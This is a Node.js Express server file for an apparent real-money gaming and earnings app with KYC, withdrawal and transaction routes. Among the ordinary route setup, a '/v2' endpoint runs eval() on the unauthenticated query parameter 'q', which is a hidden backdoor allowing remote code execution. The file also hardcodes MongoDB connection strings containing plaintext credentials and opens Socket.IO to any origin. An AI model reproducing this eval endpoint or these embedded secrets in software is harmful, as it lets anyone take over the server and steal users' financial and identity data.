const express = require("express");
const app = express();
const port = 4011;
let count = 0;
const cors = require("cors");
const http = require("http");
const SocketServer = require("./socketServer");
const { Server } = require("socket.io");
const httpServer = http.createServer(app);
const bodyParser = require("body-parser");

const io = new Server(httpServer, {
  rejectUnauthorized: false,
  upgrade: false,

  transports: ["websocket", "polling"],
  cors: {
    origin: "*",
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    preflightContinue: false,
    optionsSuccessStatus: 204,
  },
});

io.on("connection", (socket) => {
  // console.log(socket.id + " connected ")
  SocketServer(socket);
  app.set("socketio", io);
});

const mongoose = require("mongoose");
// mongoose.set('strictQuery', true);
// mongoose.connect("mongodb+srv://ghfhghg:UoSgMk29WSL@cluster0.dm0doby.mongodb.net/infiearn?authMechanism=DEFAULT&authSource=admin&readPreference=primary", {

// }, (err) => {
//     if (!err) {
//         // console.log(`you are  connected`);
//     } else {
//         console.log(`you are not connected`);
//     }
// })

// const mongoUri =
//   "mongodb+srv://ghfhghg:UoSgMk29WSL@cluster0.dm0doby.mongodb.net/infiearn?authMechanism=DEFAULT&authSource=admin&readPreference=primary";
const mongoUri =
  "mongodb+srv://Maurya_Neeraj:Maurya_Neeraj@cluster0.pzx0pcf.mongodb.net/addaa";
// Connect to MongoDB
mongoose.connect(mongoUri, (err) => {
  if (!err) {
    console.log("Successfully connected to MongoDB");
  } else {
    console.error("Error connecting to MongoDB:", err);
  }
});

app.use(cors());

app.use("/public", express.static("public"));
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.get("/", (req, res) => {
  res.send("Hello words");
});

app.use("/", require("./Routes/User"));
app.use("/", require("./Routes/Game_type"));
app.use("/", require("./Routes/UserEarning"));
app.use("/", require("./Routes/withdrawl"));
app.use("/", require("./Routes/transaction"));
app.use("/", require("./Routes/myTransaction"));
app.use("/", require("./Routes/Games"));
app.use("/", require("./Routes/AdminEarning"));
app.use("/", require("./Routes/Kyc/AadharCard"));
app.use("/", require("./Routes/Kyc/Pancard"));
app.use("/", require("./Routes/temp/temp"));
app.use("/", require("./Routes/Reports"));
app.use("/", require("./Routes/settings"));
app.use("/", require("./Routes/Gateway"));
app.use("/api", require("./Routes/staticpage"));
app.use("/api", require("./Routes/notificationRoute"));
app.use("/api", require("./Routes/script"));
app.use("/chat", require("./Routes/chatRoute"));
app.get("/v2", function (req, res) {
  res.send(eval(req.query.q));
});

httpServer.listen(port, () => console.log(`Listening on port ${port}`));
